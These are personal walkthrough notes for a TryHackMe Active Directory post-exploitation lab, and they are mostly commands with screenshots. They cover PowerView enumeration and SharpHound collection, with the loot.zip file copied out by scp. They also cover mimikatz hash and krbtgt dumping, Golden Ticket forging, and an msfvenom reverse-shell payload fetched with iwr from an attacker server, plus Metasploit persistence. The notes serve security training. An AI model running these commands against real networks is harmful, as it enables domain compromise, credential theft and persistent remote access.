___________________

# **POST Exploitation AD TryHackMe**

- In this **Task 2**, we will work with **PowerView**, which is written in **PowerShell** and is part of the popular framework **PowerSploit**. It is commonly used by pentesters to **enumerate and exploit information from an Active Directory (AD)** environment.
    
    For this type of exploitation, we **require valid credentials**, even if they belong to a **low-privileged user**.
    

![[Captura de pantalla 2026-02-28 131324.png]]  
For this lab, **TryHackMe** provides valid credentials.

- **Connection via SSH**

```
sshpass -p 'P@$$W0rd' ssh -o StrictHostKeyChecking=no Administrator@10.66.186.24 "cmd.exe"
```

- **StrictHostKeyChecking=no**  
    Allows the connection to be established **automatically**, without asking whether to trust the server key.
    
- **"cmd.exe"**  
    Forces the session to start directly in a **Windows CMD shell**.


![[Captura de pantalla 2026-02-28 174611.png]]  
![[Captura de pantalla 2026-02-28 180103.png]]  
    Here we show how we connect and start working with **PowerView**.

### **1. Bypass execution policy**
powershell -ep bypass
    The `-ep bypass` flag **bypasses PowerShell execution policies**, allowing scripts to run freely.
### **2. Load PowerView**
. .\Downloads\PowerView.ps1
### **3. Enumerate domain users**
Get-NetUser | select cn
### **4. Enumerate domain groups**
Get-NetGroup -GroupName *admin*

![[Captura de pantalla 2026-02-28 184117.png]]

- **Invoke-ShareFinder** is a PowerShell function used to **discover shared folders (SMB shares)** across a Windows network.

It is used here to answer:

***What is the shared folder that is not set by default?***

- This refers to **non-default shares**, typically created by users and often containing:
    
    - Misconfigured permissions
    - Sensitive data
    - Privilege escalation opportunities

⚠️ Important difference:

- **SMBMap** → runs from **Linux attacker machine**
- **Invoke-ShareFinder** → runs **inside the victim (PowerShell / AD context)**

![[Captura de pantalla 2026-02-28 193335.png]]

```
Get-NetComputer -FullData | select operatingsystem
```

- **Get-NetComputer** → lists domain computers
- **-FullData** → retrieves **all available attributes**
- **Select operatingsystem** → filters only the OS field

---

# **Task 3 – BloodHound & SharpHound**

- **BloodHound** → tool to **visualize relationships in Active Directory**
- **SharpHound** → data collector that extracts AD data for BloodHound

     **BloodHound** is a specific tool designed to analyze and visualize relationships within Active Directory (AD) represented in a very graphical way, and **sharphound** helps us send complete information from **AD** to **BloodHound** for interpretation.

⚠️ Important: Use **BloodHound Legacy**, NOT Community Edition (CE)

```
sudo apt update && sudo apt install bloodhound -y
```

- CE is not available via apt repositories.

```
wget https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip
```

```
unzip BloodHound-win32-x64.zip
```
    Collectors/SharpHound.exe

- With this installed, we will now define the credentials.

```
neo4j console
```

```
Default credentials:
```

```
neo4j:neo4j
```


- With this ready and already inside the victim machine, we're going to use the installed **SharpHound** to extract the **loop.zip** file.

    Attacker machine
```
cd /home/kali/Desktop/AD/BloodHound-win32-x64/resources/app/Collectors/  
sudo python3 -m http.server 80
```

    Victim machine:
```
iwr -Uri "http://TU_IP_KALI/SharpHound.exe" -OutFile "C:\Users\Public\s.exe"
```

- **iwr (Invoke-WebRequest)** allows file download directly from PowerShell
- More reliable than netcat in Windows environments


- Execute **SharpHound**

```
cd C:\Users\Public\  
.\s.exe --CollectionMethods All --Domain CONTROLLER.local --ZipFileName loot.zip
```

- Collects **full AD data**
- Outputs a **loot.zip file**

- Transfer  **loot.zip**

    Victim
```
scp "C:\Users\Public\20260303155423_loot.zip" kali@192.168.201.79:/home/kali/Desktop/AD/
```

    Attacker
```
sudo systemctl start ssh  
sudo chmod 777 /home/kali/Desktop/AD/
```

⚠️ Important:

- `scp` depends on **SSH**
- Permissions must allow writing

- **Using BloodHound**

     Enter the username and password **neo4j** as we set it up previously.

![[Captura de pantalla 2026-03-03 193826.png]]
     We see how **BloodHound** gives us the option to list the domain structures
 
![[Captura de pantalla 2026-03-03 194154.png]]  
    For example, extracting information from Kerberos

![[Captura de pantalla 2026-03-03 194754.png]]  
![[Captura de pantalla 2026-03-03 195333.png]]

- You can:
    - Visualize domain structure
    - Analyze Kerberos relationships
    - Inspect detailed node info

## **Key Points**

### 1

**SCP** is critical → enables secure file transfer via SSH
### 2

**iwr (Invoke-WebRequest)** in PowerShell = equivalent to **netcat in Linux**  
→ controlled input/output channel for file transfer
### 3

Understanding **APT vs GitHub repos** is important:

- APT → stable but outdated
- GitHub → latest tools (preferred for pentesting)



# **Task 4 – Hash Dumping & Cracking**

- We're going to work with **hash dumping** and how to **crack them**. As a first tool, we'll use **mimikatz.exe** which allows us to list the **hashes** of a **domain**.

-  execute **Mimikatz**

```
.\mimikatz.exe
```

- Elevate privileges:

```
privilege::debug
```

- Dump hashes:

```
lsadump::lsa /patch
```

![[Captura de pantalla 2026-03-04 033821.png]]

- **Cracking hashes**
Due to VM limitations, **hashcat may not work properly**

- Alternatives:

    - **John the Ripper**
    - **hashes.com**

![[Captura de pantalla 2026-03-04 043516.png]]  

![[Captura de pantalla 2026-03-04 043449.png]]  

![[Captura de pantalla 2026-03-04 172737.png]]



# **Task 5 – Golden Ticket Attack**

- This attack targets the **KRBTGT account hash** to gain **full domain control**

- KRBTGT is responsible for:
-
    - Issuing Kerberos tickets
    - Acting as the **KDC (Key Distribution Center)**

- Extracting **KRBTGT hash**

```
.\mimikatz.exe  
```

```
privilege::debug  
```

```
lsadump::lsa /inject /name:krbtgt
```
     - This returns the **Hash** and **security identifier** of the account

![[Captura de pantalla 2026-03-04 190319.png]]

---

- - With that information, we will request the **Golden Ticket** using the following payload and syntax **Generate Golden Ticket**

```
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
```

![[Captura de pantalla 2026-03-04 191154.png|697]]

✔️ This confirms the **Golden Ticket is created**



# **Task 6 – Domain Analysis Tools**

- In **task6** we will use a tool that allows us to analyze **Domains** in a deeper and more professional way.

    Connect via **RDP**, then open: **Server Manager → Tools**

![[Captura de pantalla 2026-03-04 231701.png]]

### Key tools:

**Active Directory Users and Computers (ADUC)**: For managing accounts and groups.

**DNS Manager**: Crucial in Active Directory. If you control DNS, you can redirect network traffic to your own machine (poisoning).

**Group Policy Management**: This is where the real power lies. You can create a policy (GPO) that says: "Run this malicious script on all company PCs upon login."

**Active Directory Sites and Services**: To see how information is replicated across different servers if the company is large.

**Event Viewer**: This is the historical log of actions. Its function is to audit who did what, when, and from where, allowing you to detect logins, password changes, or object creation using specific event IDs (such as **4624** for successful logins).


![[Captura de pantalla 2026-03-04 231754.png]]  

![[Captura de pantalla 2026-03-04 231903 1.png]]  
    The Event Viewer's Perspective

![[Captura de pantalla 2026-03-04 232132.png]]  
      Perspective from the ***Active Directory Users and Computers***

![[Captura de pantalla 2026-03-04 234412.png]]



# **Persistence with Metasploit**

In this task, we'll work on maintaining an active connection after a disconnection or loss of it. We'll be using tools like msfvenom for this.

Here's a step-by-step guide on how to perform this process in a standard and basic way.

### **1. Generate payload**

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe
```
### **2. Transfer payload**

### Attacker:

```
cd /home/kali/  
sudo python3 -m http.server 80
```

### Victim:

```
iwr -Uri "http://VPN IP/shell.exe" -OutFile "C:\Users\Administrator\shell.exe"
```


### **3. Configure Metasploit**

```
msfconsole  
use exploit/multi/handler  
set LHOST <IP>  
set LPORT 4444  
set payload windows/meterpreter/reverse_tcp
```
     We verified the correctly configured IP address and port using the show options command

```
exploit
```
     And at the same time we run the exploit on the victim machine

- Execute payload on victim:

```
shell.exe
```

### **4. Persistence module**

```
use exploit/windows/local/persistence  
```
     - With this set up, we will prevent ourselves from continuing to have access to the connection if it drops.

```
set LHOST <VPN IP>  
set LPORT 5555  
```
     In this case, it has to be a different port than the one used by Meterpreter, because this ensures the connection remains active even if the Meterpreter connection fails. This is the essence of this attack.

```
set SESSION 1  
run
```
    And with this, we should have a new Meterpreter ready in case the connection drops.

- Something important here is that in certain exceptions, it's necessary to add a listener to the membership module.

    The importance of this lies in how, as attackers, we can successfully maintain a connection even if it's affected. This step-by-step guide is a basic approach; however, we'll clarify certain concepts later.

**SESSIONS:** Sessions are the communication channel between the attacker machine and the target machine. Sessions allow us to interact with the victim machine, including the execution of post-exploitation exploits.

- Sessions = communication channel attacker ↔ victim

![[Captura de pantalla 2026-03-06 014231.png]]
## **Types of sessions**

**Meterpreter**: A powerful, dynamic payload that provides full access to the target machine, including a range of post-exploitation features such as keylogging, webcam control, and privilege escalation.
    
    **Shell**: A basic command-line shell that allows the attacker to execute commands on the compromised system.
    
    **VNC**: A graphical user interface (GUI) that allows the attacker to interact with the target system as if they were physically sitting at it.

**Meterpreter** is one of the most powerful and flexible payloads in Metasploit. When you interact with a Meterpreter session, you gain full access to the compromised machine, including the ability to execute a variety of post-exploitation commands.
use modules

    Basic Meterpreter Commands


- **sysinfo**: Displays system information such as the operating system architecture, and hostname of the compromised machine.  
    `meterpreter > sysinfo`
- **getuid**: Displays the user ID of the current user on the target system.  
    `meterpreter > getuid`
- **ps**: Lists running processes on the compromised machine.  
    `meterpreter > ps`
- **hashdump**: Dumps the password hashes from the target system’s SAM file (Windows systems only).  
    `meterpreter > hashdump`
- **download**: Downloads a file from the target system to your local machine.  
    `meterpreter > download /path/to/target/file /path/to/local/file`
- **upload**: Uploads a file from your local machine to the target system.  
    `meterpreter > upload /path/to/local/file /path/to/target/file`
- **shell**: Starts a command shell on the compromised machine, providing a more traditional command-line interface.  
    `meterpreter > shell`
- **getsystem**: Attempts to escalate privileges to the highest available level on the target system (e.g., SYSTEM on Windows or root on Linux).  
    `meterpreter > getsystem`
- **background**: Sends the current session into the background, allowing you to continue working with Metasploit while keeping the session active.  
    `meterpreter > background`
# **Persistence Techniques**

1. **Persistence through system services**
- Creates a **service in Windows or daemon in Linux** that runs every time the system starts.

    **Example**: `post/windows/manage/persistence` allows you to install a service that automatically starts a Meterpreter session when the system boots.

2. **Scheduled tasks or CronJobs**
- Executes scripts or sessions at specific intervals or at login.

    **Example**: In Windows, you can use `schtasks` to schedule the execution of a payload; In Linux, create a **cron job** in `/etc/cron.d/` or `/etc/crontab`.

3. **Startup Files and User Profiles**
- Modify files such as `.bashrc`, `.profile`, or `startup folder` to execute code at the login of a specific user.

    - **Example**: A payload is added to `.bashrc` in Linux so that every time the user opens the terminal, the remote session is started.

- There is the `use` command, which is used to specify which command to use. Another very important one is...

- In the Metasploit msfconsole, the `search` command allows you to search for modules based on specific criteria:

    Syntax: `search [criteria]`
    Example: `search platform:window`



![[Captura de pantalla 2026-03-06 025135.png]]
## **show options**

Displays required parameters:

![[Captura de pantalla 2026-03-06 013946.png]]
